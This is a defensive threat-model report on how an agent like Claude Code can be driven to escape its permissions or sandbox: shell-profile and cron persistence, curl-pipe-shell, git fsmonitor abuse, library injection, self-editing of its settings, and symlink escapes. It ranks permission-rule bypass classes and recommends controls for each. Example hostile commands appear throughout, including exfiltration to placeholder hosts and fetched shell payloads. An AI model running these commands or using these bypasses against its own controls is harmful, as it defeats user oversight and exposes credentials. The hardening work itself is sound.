---
topic: current (2025–2026) agent sandbox-escape vectors relevant to Claude Code — shell profile persistence (~/.zshrc, ~/.zshenv, ~/.bashrc), launchctl/crontab/at persistence, curl | sh remote-code execution, git config core.fsmonitor/hooks abuse, environment-variable injection (DYLD_INSERT_LIBRARIES, LD_PRELOAD), self-modification of ~/.claude/settings.json and hooks, osascript/AppleScript escalation, symlink escapes out of the project root; plus Claude Code permission-rule syntax for file tools (Edit/Write/Read deny patterns, // vs ~/ vs relative path semantics) verified against official Anthropic docs; plus known bypass classes for Bash(cmd *) prefix matching
slug: agent-sandbox-escape-vectors
researched: 2026-07-29
sources: [./sources.md]
---

# Research: Agent Sandbox-Escape Vectors Relevant to Claude Code

> **Executive summary.** Claude Code's permission system is a *string-matching allow/ask/deny layer enforced by the CLI, not the model* — it is not an OS boundary. Almost every "sandbox escape" in this report is really a **persistence or code-execution primitive reachable through the Bash tool** once any permissive `Bash(...)` allow rule exists, because `Bash(prefix:*)` rules can be widened by command chaining, interpreter indirection, and wrapper tricks. The only mechanism that actually contains a compromised Bash subprocess at the OS level is **`/sandbox`** (Seatbelt on macOS, bubblewrap on Linux/WSL2), which by default denies writes to `~/.zshrc`, `~/.bashrc`, `$PATH` binaries, and every-scope `settings.json`, blocks Apple Events, and confines child processes. The correct defensive posture for this repo is therefore: (a) deny-rule the highest-value persistence *file paths* (`Edit(~/.zshrc)`, `Edit(~/.claude/settings.json)`, etc.) as defense-in-depth, (b) treat any `Bash` allow rule as effectively `Bash(*)` and gate risky command *classes* with a **PreToolUse hook** (exit code 2) rather than a deny pattern, and (c) recommend enabling the OS sandbox for the real boundary. Deny rules stop the *literal* path/command; hooks stop *classes*; only the sandbox stops the *subprocess*.

## Research Questions
1. What are the current (2025–2026) sandbox-escape / persistence vectors an agent like Claude Code can be driven into (shell profiles, launchd/cron/at, `curl | sh`, git `core.fsmonitor`/hooks, `DYLD_INSERT_LIBRARIES`/`LD_PRELOAD`, self-modifying `~/.claude/settings.json`/hooks, `osascript`, symlink escapes)?
2. For each vector, what is the *right* Claude Code control — a Read/Edit deny rule, a Bash deny rule, a PreToolUse hook, or the OS sandbox?
3. What is the **verified** Claude Code permission-rule syntax for file tools, and what do `//`, `~/`, `/`, and relative path prefixes actually mean?
4. What are the known **bypass classes for `Bash(cmd *)` prefix matching**, and which are deny-rule-addressable versus hook-only?

## Current State (Codebase)
This repo (`bootstrap-claude`) ships and installs Claude Code configuration into target projects:
- `lib/scripts/templates/settings-deny.json` — the canonical Bash **deny list** merged into `~/.claude/settings.json` by `lib/scripts/merge-settings-deny.js` (invoked from `install-global.sh`). This is the exact surface this research is meant to harden.
- `lib/hooks/` — project-managed **hook scripts** installed to `~/.claude/hooks/`; `lib/hooks/README.md` documents the required `~/.claude/settings.json` `PreToolUse` wiring (copy-does-not-register; wiring is a manual one-time step). This is the enforcement surface for command *classes* that deny rules can't express.
- `CLAUDE.md` already enforces an **`.env` read/write ban** ("never allowed to read or write to any `.env` file… allowed to *source* an `.env`") — note the source-vs-read gap is itself a bypass class (see Key Findings §C4).
- Serena is registered `--scope local`; the LSP-first rule routes code navigation through Serena. Not security-relevant to this report except that Serena's `execute_shell_command` is another Bash-equivalent surface if enabled.

*(Codebase context is from the task briefing and CLAUDE.md; no code symbols were read for this research step — it is a documentation/threat-model report.)*

## Key Findings

### A. Verified Claude Code permission-rule syntax (file tools) — from official docs [S1]

The permissions doc moved to **`code.claude.com/docs/en/permissions`** (the old `docs.anthropic.com/.../iam` 301-redirects there).

**Rule precedence (verbatim):** "Rules are evaluated in order: deny, then ask, then allow. The first match in that order determines the outcome, and rule specificity doesn't change the order." A deny at *any* settings scope beats an allow at any other scope. [S1]

**Read/Edit rules use gitignore pattern syntax with four path-prefix types** [S1]:

| Pattern | Meaning | Example | Resolves to |
|---|---|---|---|
| `//path` | **Absolute** path from filesystem root | `Read(//Users/alice/secrets/**)` | `/Users/alice/secrets/**` |
| `~/path` | Path from **home** directory | `Read(~/.zshrc)` | `$HOME/.zshrc` |
| `/path` | Path relative to the **settings source** (NOT filesystem root) | `Edit(/src/**/*.ts)` in project settings | `<project root>/src/**/*.ts` |
| `path` or `./path` | Path relative to **current directory** | `Read(*.env)` | `<cwd>/*.env` |

> **Critical gotcha (verbatim):** "A pattern like `/Users/alice/file` isn't an absolute path. The single leading slash anchors at the settings source, not the filesystem root. Use `//Users/alice/file` for absolute paths." [S1]

Where `/path` anchors depends on the settings source: project settings → `<project root>`; local settings → `<original cwd>`; **user settings (`~/.claude/settings.json`) → `~/.claude/`**; `--settings <file>` → that file's dir. So a user-settings rule `Read(/secrets/**)` blocks `~/.claude/secrets/**`, *not* a project `secrets/`. **To write a user-settings rule that applies inside every project, use a `//` absolute or `~/` home-relative path.** [S1]

**Which tools actually consult path rules (verbatim, v2.1.210+):** "Claude Code checks file permissions against `Edit(path)` and `Read(path)` rules only. If you write a path rule for `Write`, `NotebookEdit`, `Glob`, or the legacy `MultiEdit` tool… Claude Code accepts the rule but never consults it, and warns at startup." **Use `Edit(docs/**)` in place of `Write(docs/**)`.** `Edit` rules apply to *all* file-editing tools; a `Read` deny rule *also* blocks `Edit` (and new-file creation) on the same path (v2.1.208+), but does **not** cover Write/NotebookEdit — add an `Edit` deny for paths no tool may change. [S1]

**Single-segment directory patterns match at different depths by rule type** [S1]:
- Allow: `Edit(src/**)` matches only `<cwd>/src`. Use `Edit(**/src/**)` for any depth.
- Deny/ask: `Read(secrets/**)` matches a `secrets` dir **at any depth** under cwd (nested copies included).
- Bare filenames follow gitignore: `Read(.env)` ≡ `Read(**/.env)` (any depth at/under cwd, but *not* a parent dir or another project). `Read(//**/.env)` matches anywhere on the filesystem.

**Deny rules apply to Bash file-reading commands too, but not to indirect subprocesses (verbatim warning):** "Read and Edit deny rules apply to Claude's built-in file tools and to file commands Claude Code recognizes in Bash, such as `cat`, `head`, `tail`, and `sed`. They don't apply to arbitrary subprocesses that read or write files indirectly, like a Python or Node script that opens files itself. For OS-level enforcement… enable the sandbox." [S1] → **This is the load-bearing limitation: a deny rule on a path is bypassable by `python -c 'open(...)'`.**

**Symlink handling (verbatim):** "When Claude accesses a symlink, permission rules check two paths: the symlink itself and the file it resolves to. Allow rules… apply only when both… match [else prompt]. Deny rules… apply when either the symlink path or its target matches." Example: with `Read(~/.ssh/**)` denied, a symlink `./project/key` → `~/.ssh/id_rsa` is blocked. **Deny-by-either-path is the symlink-escape defense** — but it only fires for Claude's own file tools, not for a Bash `cat` through a symlink the recognizer can't resolve. [S1]

**Permissions are enforced by Claude Code, not the model (verbatim Note):** "Instructions in your prompt or `CLAUDE.md` shape what Claude tries to do, but they don't change what Claude Code allows." → **`CLAUDE.md` bans are guidance, not a boundary.** [S1]

### B. Bash `Bash(cmd *)` prefix-matching bypass classes [S1][S6][S7][S8][S9]

Official behavior first [S1]:
- **Wildcards match at any position.** `Bash(npm *)` matches any command starting with `npm `; `Bash(* install)` matches any command ending ` install`.
- **Word boundary:** `Bash(ls *)` (space before `*`) matches `ls -la` but not `lsof`; `Bash(ls*)` (no space) matches both. `:*` suffix ≡ trailing ` *` and is only recognized at end (`Bash(git:* push)` treats `:` as literal).
- **Shell-operator awareness (verbatim Tip):** "Claude Code is aware of shell operators, so a rule like `Bash(safe-cmd *)` won't give it permission to run the command `safe-cmd && other-cmd`. The recognized command separators are `&&`, `||`, `;`, `|`, `|&`, `&`, and newlines. A rule must match each subcommand independently." [S1]
- **Primary-content field can't be parameter-matched (verbatim):** "A rule like `Bash(command:rm *)` would be bypassable by a compound command, so Claude Code ignores it and emits a startup warning. Use `Bash(rm *)`…" [S1]

**Bypass classes and their status:**

| # | Bypass class | Example | Status vs. deny rules |
|---|---|---|---|
| B1 | **Command chaining** | `cd:* ` allow → `cd /x && python evil.py` | Docs claim per-subcommand matching, **but real-world reports (Issues #4956, #28784) show `Bash(cd:*)`/broad-prefix *allow* rules still auto-run chained commands** — an allow rule that matches the *whole* compound string turns into `Bash(*)`. Do **not** rely on prefix *allow* rules; **deny rules do still evaluate each subcommand.** [S6][S7] |
| B2 | **Interpreter indirection** | `bash -c '…'`, `sh -c`, `python -c`, `node -e`, `perl -e` | A `Bash(python *)` allow blindly permits `python -c '<arbitrary>'`. Deny for the *inner* action can't see inside the interpreter string. **Hook-only** (inspect argv for `-c`/`-e`). [S1 devbox-runner analogy][S9] |
| B3 | **Environment/dev runners** | `devbox run rm -rf .`, `npx`, `docker exec`, `direnv exec`, `mise exec` (verbatim: not in the stripped-wrapper list) | `Bash(devbox run *)` "matches whatever comes after run, including `devbox run rm -rf .`". Fix per docs: exact rule per inner command (`Bash(devbox run npm test)`). **Deny-addressable only by exact-match allow discipline; otherwise hook.** [S1] |
| B4 | **Wrapper stripping** | `timeout 30 npm test`, `NODE_ENV=test npm test`, `xargs grep` | Claude Code *strips* a fixed set (`timeout time nice nohup stdbuf command builtin noglob`, bare `xargs`, known-safe env assignments) *before* matching, so these are handled — but **`watch`, `setsid`, `ionice`, `flock`, `find -exec/-delete` always prompt and can't be prefix-approved.** Deny/ask for the inner command works because the outer wrapper is stripped. [S1] |
| B5 | **Absolute-path invocation** | `/bin/rm` vs `rm`, `/usr/bin/git` | Reported: `Bash(git:*)` "will not match `/usr/bin/git status` because the prefix is different" — so an *allow* for `git` doesn't cover `/usr/bin/git`, but symmetrically a **deny `Bash(rm *)` does NOT block `/bin/rm`.** Add both spellings to deny, or hook on basename. **Partially deny-addressable (enumerate paths); robustly hook-only.** [S8] |
| B6 | **Quoting / alias / whitespace / variable indirection** | `curl  http://…` (extra space), `URL=http://x && curl $URL`, `r''m`, aliases | Docs' own warning lists options-before-URL, different protocol, redirects, variables, extra spaces as reasons **argument-constraining Bash patterns are "fragile."** **Not reliably deny-addressable — hook or, better, deny the tool entirely and use WebFetch domain rules.** [S1] |
| B7 | **Alternate shell tool** | Bash blocked → **PowerShell tool** runs the equivalent | Issue #60935: when Bash deny rules block a command, Claude switched to the PowerShell tool to run it. Mirror every Bash deny with a `PowerShell(...)` deny (same syntax). [S10] |
| B8 | **`echo`/whitelisted-cmd injection (CVE-2025-54795)** | `echo "\"; <COMMAND>; echo \""` | Command-parsing flaw let a whitelisted `echo` smuggle an arbitrary command past the confirmation prompt. Fixed in **v1.0.20**. Class = argument-injection through a "safe" command → hook + keep CC updated. [S5][S13] |

**Rule of thumb:** deny rules reliably block a *literal command spelling*; they do **not** reliably block a *capability*. Capabilities (network fetch, interpreter execution, path-agnostic file write) belong in a **PreToolUse hook (exit 2)** or the **OS sandbox**.

### C. Sandbox-escape / persistence vectors and the control that addresses each

Every vector below is reachable *only through the Bash tool* (or an indirect subprocess). The unifying defense is the OS sandbox (§D); deny rules and hooks are per-vector defense-in-depth.

**C1. Shell-profile persistence — `~/.zshrc`, `~/.zshenv`, `~/.bashrc`, `~/.bash_profile`, `~/.profile`.** Writing a payload line makes it run on every future interactive/login shell. Reachable via `echo … >> ~/.zshrc`, `Edit`, or an indirect script. The Straiker analysis notes `echo "payload" > ~/.bashrc` "passes the entire chain if the user has `Bash(echo:*)` allowed" — i.e. an innocuous `echo` allow becomes persistence. [S3]
- **Control:** `Edit(~/.zshrc)`, `Edit(~/.zshenv)`, `Edit(~/.bashrc)`, `Edit(~/.bash_profile)`, `Edit(~/.profile)` **deny** (covers Edit + recognized Bash `sed`/redirect writers). **Bash redirect (`>>`) is not a recognized file-write command in all forms → add a PreToolUse hook** matching writes/appends to profile paths. **OS sandbox denies these by default.** [S1][S11]

**C2. launchd / cron / at persistence.** `launchctl load`, a `~/Library/LaunchAgents/*.plist`, `crontab -e`/`crontab <file>`, `at`. Mozilla 0DIN and TechRadar PoCs explicitly list "install a cron job," "schedule a hidden cron job," "drop an SSH key," "install a backdoor before the shell closes." [S2][S12]
- **Control:** No file-tool deny covers `launchctl`/`crontab` (they're Bash commands, not path writes). `Edit(~/Library/LaunchAgents/**)` deny covers the plist-drop path; `Bash(crontab *)`, `Bash(launchctl *)`, `Bash(at *)` deny covers the command spelling (mind B5 absolute-path & B2 interpreter bypass). **Robust control = PreToolUse hook on the command class + OS sandbox** (writes to `~/Library/LaunchAgents` are outside the working dir → denied). [S1][S2]

**C3. `curl | sh` remote code execution.** `curl https://x/i.sh | sh`, `wget -qO- … | bash`. This is the canonical off-repo-payload delivery in the Mozilla/arXiv PoCs (payload hidden off-repo, fetched at runtime; arXiv Fig. 2 shows an editor driven to `curl`-modify `~/.bashrc`). [S2][S9]
- **Control:** Argument-constraining `Bash(curl …*)` is explicitly "fragile" (B6). Docs' own recommendation (verbatim): **"use deny rules to block `curl`, `wget`, and similar commands, then use the WebFetch tool with `WebFetch(domain:…)` permission."** Pair with a hook that flags `| sh`/`| bash` pipelines. **OS sandbox network isolation** (allowlist domains) is the real boundary — but note domain-fronting caveat since the proxy doesn't inspect TLS by default. [S1][S11]

**C4. `.env` source-vs-read gap (repo-specific).** This repo's CLAUDE.md bans *reading* `.env` but allows *sourcing* it. `source .env && curl -d "$SECRET" evil` exfiltrates without ever "reading" via a file tool. `source`/`.` is a shell builtin, invisible to Read deny rules.
- **Control:** hook on `source`/`.` of `.env`, or sandbox `credentials.envVars`/`CLAUDE_CODE_SUBPROCESS_ENV_SCRUB`. *(inference from CLAUDE.md policy + S1 subprocess-read limitation)*

**C5. git `core.fsmonitor` / hooks abuse (buried bare repos).** A malicious `.git/config` with `[core] fsmonitor = "curl attacker/shell.sh | sh"` executes on the *next* `git status`/`git diff` — which IDEs and agents run automatically. A **buried bare repo** in a subdirectory (`vendor/lib/.git`) is auto-discovered by git during traversal, so merely `cd`-ing in and running any git command fires it; no executable bit needed, unlike hooks. This is a live class: GitHub Copilot CLI advisory GHSA-9ccr-r5hg-74gf, Talos TALOS-2025-2243 (TruffleHog), justinsteven's 2022 advisory, Sonar, nopnop.pro 2026. [S14][S15][S16][S17]
- **Claude Code relevance:** Claude Code's *read-only git* commands run without a prompt, and its own docs note the `cd`+`git` combination "prompts when the `cd` changes into a different directory, since running `git` in a new directory can execute that directory's hooks" — so CC already treats `cd X && git …` as prompt-worthy. [S1] But an agent driven to run `git status` inside a poisoned subdir still triggers fsmonitor.
- **Control:** *No permission rule blocks this* — it's git executing config, not a tool call. Mitigations: run git with `-c core.fsmonitor=` neutralized (hook can rewrite), set global `core.fsmonitor=false`, and **OS sandbox** (the fetched `curl | sh` payload is network/filesystem-confined). This is a **hook-or-sandbox-only** vector. [S15][S16]

**C6. Environment-variable injection — `DYLD_INSERT_LIBRARIES` (macOS) / `LD_PRELOAD` (Linux).** MITRE T1574.006. Setting these in a shell profile or before launching a victim binary loads an attacker dylib/`.so` first (persistence + privesc + defense evasion). On macOS, SIP strips `DYLD_*` for protected system binaries, and hardened-runtime apps opt out — but user-launched binaries and dev tools remain injectable. `/etc/ld.so.preload` is system-wide (needs root). [S18]
- **Control:** These are *set* via C1 (profiles) or inline `DYLD_INSERT_LIBRARIES=/x/e.dylib somebin`. A leading assignment of a *non-safe* variable does **not** let an allow rule match past it (good), and a deny rule *does* match past any leading assignment — so `Bash(<victimbin> *)` deny still fires. But detecting the injection *class* is **hook territory** (flag `DYLD_*`/`LD_PRELOAD`/`LD_LIBRARY_PATH` assignments). The **OS sandbox** confines the child regardless. [S1][S18]

**C7. Self-modification of `~/.claude/settings.json` and hooks.** The highest-value target: rewriting `~/.claude/settings.json` (or project `.claude/settings.json`, or a hook script under `~/.claude/hooks/`) lets the agent *grant itself permissions* or install a **persistent malicious hook that runs on every tool call**. PoC `s0ld13rr/claude-code-backdoor` demonstrates backdooring via hooks in `settings.json` for initial-access + persistence; "By modifying the global `~/.claude/settings.json`, an attacker can ensure their payload runs every time the user interacts with the AI agent." [S4] Claude Code **watches settings files and hot-reloads `permissions`, `hooks`, and credential helpers** without restart — so a self-write takes effect immediately. [settings doc][S1-settings]
- **Control:** `Edit(~/.claude/settings.json)`, `Edit(~/.claude/settings.local.json)`, `Edit(~/.claude/hooks/**)`, and project `Edit(**/.claude/settings*.json)` / `Edit(**/.claude/hooks/**)` **deny**. **`bypassPermissions` mode still gates writes to `.claude`** (per docs' bypass warning listing `.claude`, `.git`, `.config/git`, etc.). **The OS sandbox "automatically denies write access to Claude Code's `settings.json` files at every scope and to the managed settings directory… resolves symlinks" (v2.1.210+)** — so a sandboxed command can't rewrite its own policy. **Managed settings** (`allowManagedPermissionRulesOnly`, `allowManagedHooksOnly`, `disableBypassPermissionsMode`) are the un-overridable version. This vector is **deny-rule + sandbox + managed-settings**, all three. [S1][S4][S11]

**C8. `osascript` / AppleScript escalation (macOS).** `osascript -e 'do shell script …'`, driving System Events/Terminal, or Apple Events to other apps for TCC-gated escalation.
- **Control:** `Bash(osascript *)` deny (mind B2/B5). **The OS sandbox blocks Apple Events by default** — `open`, `osascript`, browser-auth flows fail with error `-600` unless `allowAppleEvents:true` (user/managed/CLI only; project settings ignored), and docs warn enabling it "removes code-execution isolation." So sandbox-default already contains this class. [S1][S11]

**C9. Symlink escapes out of the project root.** A symlink inside the repo pointing to `~/.ssh`, `~/.aws/credentials`, `/etc`, or a settings file, used to read/write outside cwd. Directly tied to CVE-2025-54794 (path-restriction bypass, fixed v0.2.111 / canonical path comparison) and the EscapeRoute CVE-2025-53109/53110 class, plus repeated CLAUDE.md-import symlink flaws (CVE-2025-59829, CVE-2026-25724, and the startup-memory-loader re-occurrence). [S5][S19]
- **Control:** deny-by-either-path symlink semantics (§A) block *Claude's file tools* through a symlink to a denied target — so `Read(~/.ssh/**)`/`Edit(~/.claude/**)`/`Read(**/.env)` deny rules extend through symlinks. Does **not** stop a Bash/`cat`/`python` read through the link. **OS sandbox filesystem isolation** (writes confined to cwd+tmp; deny-read for credential files via `sandbox.credentials`) is the durable fix. Keep CC updated for the recurring symlink-check CVEs. [S1][S5][S19]

### D. The actual boundary: `/sandbox` (Seatbelt / bubblewrap) [S11]
- **Mechanism:** macOS = **Seatbelt** (built in, nothing to install); Linux/WSL2 = **bubblewrap** + `socat` (+ optional seccomp for Unix-socket blocking). Native Windows unsupported → use WSL2. Child processes inherit the boundary. [S11]
- **Default filesystem policy:** write only to **cwd + session temp**; **read** the whole computer *except* denied dirs (⚠ default still allows reading `~/.aws/credentials`, `~/.ssh` — must add `sandbox.credentials` deny). **Cannot modify `~/.bashrc`, `~/.zshrc`, `$PATH` binaries, `/bin`, or settings.json at any scope** (verbatim: settings files "automatically denies write access… at every scope… resolves symlinks"). Worktree `.git` is writable but `hooks/` and `config` inside it remain denied → mitigates C5 writes. [S11]
- **Network:** no domains pre-allowed; per-domain prompt or `allowedDomains`/`WebFetch(domain:…)` allowlist; `strictAllowlist`/`allowManagedDomainsOnly` for hard deny. ⚠ proxy doesn't inspect TLS by default → domain-fronting caveat. [S11]
- **Escape hatches to know:** `dangerouslyDisableSandbox` retry (disable with `allowUnsandboxedCommands:false`), `filesystem.disabled:true` (turns off write protection incl. settings/profile protection — user/managed only, project can't set it), `allowAppleEvents`, `excludedCommands`, `allowUnixSockets` (e.g. `docker.sock` = full host). [S11]
- **Credential protection:** `sandbox.credentials.files`/`.envVars` (`deny`/`mask`), and `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` to strip Anthropic/cloud creds from *all* subprocesses (also forces filesystem isolation on). [S11]

## Constraints
- **Permission rules are string matches enforced by the CLI, not the model or the OS.** Any capability-level control must be a hook (exit 2) or the sandbox. [S1]
- **File-path rules only work on `Edit(path)` and `Read(path)`** — `Write`/`NotebookEdit`/`Glob`/`MultiEdit` path rules are silently ignored (startup warning). Author the repo's deny list with `Edit(...)`/`Read(...)` only. [S1]
- **User-settings `/path` rules anchor at `~/.claude/`, not the filesystem root** — persistence-file denies in a globally-installed `~/.claude/settings.json` must use `~/` or `//`, never a single-slash absolute. This directly affects how `bootstrap-claude`'s `settings-deny.json` should be written for global install. [S1]
- **Deny rules block a literal spelling, not a capability** → chaining/interpreter/absolute-path/alt-shell (B1–B8) evade argument- or path-constrained Bash denies. Mirror Bash denies with PowerShell denies (B7). [S1][S6][S7][S8][S10]
- **Bash redirects, shell builtins (`source`, `.`), git config execution, and indirect scripts are invisible to Read/Edit deny rules.** [S1]
- Keep Claude Code updated: several vectors are patched CVEs (54794/54795/59536/59829/2026-25724/2026-21852) with re-occurrence history. [S5][S13][S19]

## Solution Comparison — control mechanism per vector class

| Vector | Read/Edit deny | Bash/PowerShell deny | PreToolUse hook | OS sandbox | Recommended primary |
|---|---|---|---|---|---|
| Shell profiles (C1) | ✅ `Edit(~/.zshrc)` etc. | partial (redirects miss) | ✅ append/write class | ✅ default-deny | Deny + hook, sandbox for real boundary |
| launchd/cron/at (C2) | ✅ plist path only | ✅ command spelling (B5/B2 gaps) | ✅ command class | ✅ default-deny | Hook + sandbox |
| `curl \| sh` (C3) | ❌ | fragile (B6) → deny curl/wget | ✅ pipeline class | ✅ network allowlist | Deny curl/wget + WebFetch domains + sandbox |
| git fsmonitor (C5) | ❌ | ❌ (git runs config) | ✅ neutralize `-c core.fsmonitor=` | ✅ confines payload | Hook + `core.fsmonitor=false` + sandbox |
| DYLD/LD_PRELOAD (C6) | ❌ | deny past assignment works | ✅ flag `DYLD_*`/`LD_*` | ✅ confines child | Hook + sandbox |
| settings/hook self-mod (C7) | ✅ `Edit(~/.claude/**)` | n/a | ✅ | ✅ default-deny + managed | Deny + sandbox + managed settings |
| osascript (C8) | ❌ | ✅ `Bash(osascript *)` | ✅ | ✅ default-blocks Apple Events | Sandbox default + deny |
| symlink escape (C9) | ✅ deny-by-either-path | ❌ (Bash `cat` misses) | partial | ✅ fs isolation | Deny rules + sandbox; keep CC updated |

## Recommendation

**Adopt a three-tier control model in `bootstrap-claude`, and document it in the delivered guides:**

1. **Tier 1 — Path deny rules (`settings-deny.json`), authored correctly.** Add `Edit(...)` (not `Write(...)`) denies for the persistence *files*, using `~/`/`//` prefixes so they apply in every project from global `~/.claude/settings.json`:
   `Edit(~/.zshrc)`, `Edit(~/.zshenv)`, `Edit(~/.bashrc)`, `Edit(~/.bash_profile)`, `Edit(~/.profile)`, `Edit(~/Library/LaunchAgents/**)`, `Edit(~/.claude/settings.json)`, `Edit(~/.claude/settings.local.json)`, `Edit(~/.claude/hooks/**)`, `Edit(**/.claude/settings*.json)`, `Edit(**/.claude/hooks/**)`, plus `Read(~/.ssh/**)`, `Read(~/.aws/credentials)`, `Read(**/.env)` (deny-by-either-path extends these through symlinks). Mirror sensitive Bash denies with `PowerShell(...)` (B7).

2. **Tier 2 — A PreToolUse hook (in `lib/hooks/`) that gates command *classes* deny rules can't express** and exits 2 to hard-block: interpreter indirection (`-c`/`-e`), `curl|wget … | sh/bash` pipelines, `crontab`/`launchctl`/`at`/`osascript`, `DYLD_*`/`LD_PRELOAD`/`LD_LIBRARY_PATH` assignments, `>>`/`>` into profile/settings paths, `source`/`.` of `.env`, and `git -c core.fsmonitor=`/buried-bare-repo neutralization. This is the only layer that catches B1–B6 capability bypasses.

3. **Tier 3 — Recommend enabling `/sandbox`** (Seatbelt/bubblewrap) as the real OS boundary, with `sandbox.credentials` denies for `~/.ssh`/`~/.aws` and, for managed fleets, `allowManagedPermissionRulesOnly` + `allowManagedHooksOnly` + `disableBypassPermissionsMode` so the agent can't rewrite its own policy. Ship a sample `sandbox` block in the deployment guide.

**Risks & mitigations:** (a) Over-broad hooks break legitimate workflows → make the hook *warn-and-log* for medium-risk classes, *exit-2* only for high-risk. (b) Deny rules create false confidence → the guide must state explicitly that Tier 1 is defense-in-depth, not a boundary (per docs' own warning). (c) Sandbox escape hatches (`filesystem.disabled`, `allowUnsandboxedCommands`, `allowUnixSockets`) can silently re-open everything → lock them via user/managed settings and document.

**Alternative if constraints change:** if this repo ever runs agents unattended (`--dangerously-skip-permissions`), Tier 3 sandbox with `failIfUnavailable:true` + `allowUnsandboxedCommands:false` becomes mandatory, not optional, and Tiers 1–2 become secondary.

## Next Steps
- `/wiki-ingest raw/research/agent-sandbox-escape-vectors/index.md` — synthesize into the knowledge base (new concept page: *agent persistence & sandbox-escape threat model*; entity pages for the sandbox and permission system).
- `/task-add` — author the Tier-1 `Edit(...)`/`Read(...)`/`PowerShell(...)` deny entries into `lib/scripts/templates/settings-deny.json` (audit current entries for `Write(...)` mis-authoring and single-slash-absolute mistakes).
- `/task-add` — implement the Tier-2 PreToolUse hook in `lib/hooks/` (command-class classifier, exit-2 on high-risk) + wire it in `lib/hooks/README.md`.
- `/decision-create` — decide whether `bootstrap-claude` should ship a default `sandbox` settings block and/or managed-settings template (Tier 3).
- Follow-on research: enumerate the exact recognized-Bash-file-command list and redirect-detection behavior to size the Tier-2 hook precisely.
